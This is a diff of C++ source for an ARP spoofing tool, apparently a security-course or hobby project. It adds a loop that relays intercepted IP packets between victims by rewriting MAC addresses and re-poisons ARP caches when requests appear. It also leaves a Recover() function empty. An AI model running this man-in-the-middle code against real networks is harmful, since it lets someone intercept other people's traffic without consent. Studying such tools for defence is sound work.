@@ -20,6 +20,25 @@ void ArpSpoofing::RecvPacketThreadFunc() {
             case STATUS_PLAY: {
                 unique_lock<mutex> t(this->mtx_);
                 if(this->ReadPacket()) {
+                    for(Flow& flow : flowList_) {
+                        RecvData data = this->GetPacket(EthHdr::Ip4, string(flow.sip_), IpHdr::ICMP, 0);
+                        if(!data.empty()) {
+                            PEthHdr pEtherHeader = reinterpret_cast<PEthHdr>(data.buf);
+                            PIpHdr pIpHeader = reinterpret_cast<PIpHdr>(data.buf + sizeof(EthHdr));
+                            if(pIpHeader->dip().compare(string(flow.sip_)) == 0) {
+                                //relay ip packet
+                                pEtherHeader->dmac_ = arpTable_[flow.sip_];
+                            }else
+                                //spoofed ip packet
+                                pEtherHeader->dmac_ = arpTable_[flow.tip_];
+
+                            SendPacket(data.buf, data.header->len);
+                        }
+
+                        data = this->GetPacket(EthHdr::Arp, string(flow.sip_), IpHdr::HOPOST, 0);
+                        if(!data.empty())
+                            Infect();
+                    }
                 }
                 t.unlock();
                 break;
@@ -36,8 +55,9 @@ END:
     return;
 }
 
-Mac ArpSpoofing::ResolveMac(const string targetIP) {
-    Mac ret{};
+void ArpSpoofing::ResolveMac(const string targetIP) {
+    //if(arpTable_[targetIP] != NULL) return;
+
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
 
     try {
@@ -56,7 +76,7 @@ Mac ArpSpoofing::ResolveMac(const string targetIP) {
         if(ioctl(sock, SIOCGARP, &req) == -1)
             throw runtime_error("Failed to set ioctl");
 
-        ret = reinterpret_cast<u_char*>(req.arp_ha.sa_data);
+        arpTable_[Ip(targetIP)] = reinterpret_cast<u_char*>(req.arp_ha.sa_data);
 
     }catch(const exception& e) {
         cerr<<"GetMacAddress : "<<e.what()<<endl;
@@ -64,15 +84,16 @@ Mac ArpSpoofing::ResolveMac(const string targetIP) {
     }
 
     close(sock);
-
-    return ret;
 }
 
 bool ArpSpoofing::Infect() {
     try {
         //if(cInterfaceInfo_ == NULL) throw runtime_error("interface is not setup.");
         for(Flow& flow : flowList_) {
-            Mac targetMac = ResolveMac(string(flow.tip_));
+            ResolveMac(string(flow.tip_));
+            Mac& targetMac = arpTable_[flow.tip_];
+
+            //Mac targetMac = arpTable_(string(flow.tip_));
             if(targetMac.isNull()) throw runtime_error("target mac is null");
 
             EthArpPacket packet{};
@@ -107,9 +128,20 @@ bool ArpSpoofing::Infect() {
     return true;
 }
 
+bool ArpSpoofing::Recover() {
+    for(Flow& flow : flowList_) {
+
+    }
+}
+
 //public
 ArpSpoofing::ArpSpoofing() {
+    OpenThread();
+}
 
+ArpSpoofing::~ArpSpoofing() {
+    this->end();
+    this->hPThread_.join();
 }
 
 
@@ -158,4 +190,5 @@ list<Flow> ArpSpoofing::GetFlows() {
 
 void ArpSpoofing::Run() {
     Infect();
+    play();
 }
